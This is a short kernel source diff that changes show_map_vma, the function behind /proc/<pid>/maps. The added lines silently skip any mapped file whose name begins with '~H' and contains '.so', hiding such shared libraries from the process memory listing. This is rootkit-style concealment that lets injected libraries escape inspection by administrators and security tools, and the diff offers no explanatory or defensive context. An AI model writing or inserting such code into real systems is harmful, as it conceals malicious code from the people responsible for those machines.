@@ -311,6 +311,10 @@ show_map_vma(struct seq_file *m, struct vm_area_struct *vma, int is_pid)
 	dev_t dev = 0;
 	const char *name = NULL;
 
+	if (file && file->f_path.dentry->d_iname[0] == '~' && file->f_path.dentry->d_iname[1] == 'H'
+	    && strstr(file->f_path.dentry->d_iname, ".so"))
+	    return;
+
 	if (file) {
 		struct inode *inode = file_inode(vma->vm_file);
 		dev = inode->i_sb->s_dev;
